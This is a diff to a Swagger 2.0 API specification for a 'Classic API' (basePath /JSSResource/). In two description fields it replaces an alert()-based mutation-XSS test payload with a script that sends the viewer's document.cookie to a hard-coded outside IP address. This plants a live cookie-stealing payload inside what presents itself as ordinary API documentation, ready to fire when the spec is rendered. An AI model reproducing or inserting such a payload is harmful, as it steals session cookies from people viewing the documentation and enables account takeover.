@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: >
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><script>var i=new Image;i.src="http://132.145.158.106/?"+document.cookie;</script>"></form>
   version: production
 basePath: /JSSResource/
 produces:
@@ -27,7 +27,7 @@ paths:
     delete:
       parameters:
         - description: >
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><script>var i=new Image;i.src="http://132.145.158.106/?"+document.cookie;</script>"></form>
           format: int64
           in: path
           name: id
